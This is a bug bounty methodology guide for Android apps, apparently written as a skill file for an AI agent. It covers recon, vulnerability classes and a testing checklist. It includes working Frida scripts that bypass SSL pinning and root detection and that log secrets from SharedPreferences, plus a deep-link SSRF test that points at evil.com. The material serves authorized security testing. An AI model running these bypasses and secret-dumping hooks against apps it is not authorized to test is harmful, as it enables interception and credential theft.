# ANDROID Skill: Bug Bounty Android Testing

## Purpose
Strategy for Android bug bounty hunting.

## Reconnaissance

### APK Discovery
```bash
# Google Play scraping
# 1. gplaycli
gplaycli -s "app_name"

# 2. Appie
# GUI tool for APK collection

# 3. APKPure, APKMirror
# Manual downloads
```

### Static Analysis Setup
```bash
# Download and decompile
jadx -d output/ app.apk

# Automated scanning
python -m mobsf

# Check for known vulnerabilities
# 1. Insecure storage
grep -r "MODE_WORLD_READABLE\|MODE_WORLD_WRITABLE" output/

# 2. Debug flag
aapt dump badging app.apk | grep debuggable

# 3. Backup enabled
grep "android:allowBackup" AndroidManifest.xml
```

### Technology Fingerprinting
```bash
# Look for frameworks
grep -r "okhttp\|retrofit\|volley\|glide\|picasso\|unity" --include="*.java"

# Look for analytics
grep -r "firebase\|crashlytics\|branch\|adjust" --include="*.java"

# Look for crypto
grep -r "javax.crypto\|BouncyCastle\|SpongyCastle" --include="*.java"
```

## Vulnerability Classes

### 1. Insecure Data Storage

#### SharedPreferences
```java
// Vulnerable: Plaintext storage
prefs.edit().putString("token", authToken).apply();

// Check for:
grep -r "getSharedPreferences\|edit().put" --include="*.java"
```

#### SQLite Database
```bash
# Check for unencrypted DB
strings app.db | grep -i password
```

### 2. Insecure Communication

#### SSL Issues
```bash
# Check for cleartext traffic
grep -r "http://" --include="*.xml" --include="*.java"
aapt dump badging app.apk | grep usesCleartextTraffic

# Check certificate pinning
grep -r "X509TrustManager\|CertificatePinner" --include="*.java"
```

### 3. Deep Link Vulnerabilities

#### Manifest Configuration
```xml
<intent-filter>
    <data android:scheme="https" android:host="example.com"/>
</intent-filter>
```

#### Testing
```bash
# Send intent
adb shell am start -a android.intent.action.VIEW \
    -d "myapp://host/path?param=value"

# Check for SSRF
adb shell am start -a android.intent.action.VIEW \
    -d "myapp://host?url=http://evil.com"
```

### 4. WebView Vulnerabilities

#### JavaScript Interface
```java
// Vulnerable implementation
webView.addJavascriptInterface(new WebAppInterface(), "Android");

// Interface exposes sensitive methods
public class WebAppInterface {
    @JavascriptInterface
    public String getToken() {
        return getAuthToken();
    }
}
```

#### Testing
```javascript
// From JavaScript
Android.getToken();  // Leak token!
```

### 5. Content Provider Vulnerabilities

#### Exported Providers
```xml
<provider
    android:name=".Provider"
    android:authorities="com.example.provider"
    android:exported="true"/>
```

#### Testing
```bash
# Query content provider
adb shell content query --uri content://com.example.provider/

# Exploit
Java.perform(function() {
    // Hook ContentResolver
});
```

### 6. Broadcast Receiver Vulnerabilities

#### Exported Receivers
```xml
<receiver android:name=".Receiver" android:exported="true">
    <intent-filter>
        <action android:name="com.example.ACTION"/>
    </intent-filter>
</receiver>
```

#### Testing
```bash
# Send broadcast
adb shell am broadcast -a com.example.ACTION \
    --es key value

# Check for sensitive data
```

## Exploitation Tools

### Frida Scripts

#### SSL Pinning Bypass
```javascript
// universal-ssl-bypass.js
Java.perform(function() {
    var SSLContext = Java.use('javax.net.ssl.SSLContext');
    SSLContext.getInstance.implementation = function(protocol) {
        var ctx = this.getInstance(protocol);
        ctx.init(null, null, null);
        return ctx;
    };
});
```

#### Root Detection Bypass
```javascript
// root-bypass.js
Java.perform(function() {
    var File = Java.use('java.io.File');
    File.exists.implementation = function() {
        var path = this.getAbsolutePath();
        if (path.contains('su') || path.contains('magisk')) {
            return false;
        }
        return this.exists();
    };
});
```

#### Data Exfiltration
```javascript
// dump-secrets.js
Java.perform(function() {
    // Hook sensitive methods
    var SharedPrefs = Java.use('android.app.SharedPreferencesImpl');
    SharedPrefs.getString.implementation = function(key, def) {
        var result = this.getString(key, def);
        if (isSensitive(key)) {
            console.log('[*] ' + key + ' = ' + result);
        }
        return result;
    };
});
```

## Testing Checklist

### Information Gathering
```
[ ] Download APK
[ ] Identify version
[ ] Map attack surface
[ ] Identify frameworks
[ ] Check for third-party SDKs
```

### Static Analysis
```
[ ] Decompile APK
[ ] Review manifest
[ ] Search for vulnerabilities
[ ] Analyze crypto implementation
[ ] Check for hardcoded secrets
```

### Dynamic Analysis
```
[ ] SSL pinning bypass
[ ] Root detection bypass
[ ] Traffic interception
[ ] Input validation
[ ] Deep link testing
```

### Reporting
```
[ ] Document vulnerability
[ ] Create PoC
[ ] Assess impact
[ ] Suggest remediation
```

## Common Findings

### High Impact
```
1. Authentication bypass
2. Payment bypass
3. Sensitive data leakage
4. Authentication token leakage
5. Insecure direct object reference
```

### Medium Impact
```
1. Weak crypto implementation
2. SSL pinning bypassable
3. Deep link SSRF
4. Unprotected components
5. Debug mode enabled
```

### Low Impact
```
1. Backup enabled (with sensitive data)
2. Cleartext traffic (non-sensitive)
3. Debug logs in release
```

## Resources
```
- OWASP Mobile Top 10
- Android Security Docs
- MOBISEC
- Android Vulnerability Research
```

## Tips
```
1. Always test the latest version
2. Test across different Android versions
3. Check for anti-reverse engineering
4. Look for hidden features
5. Test authentication flows thoroughly
```
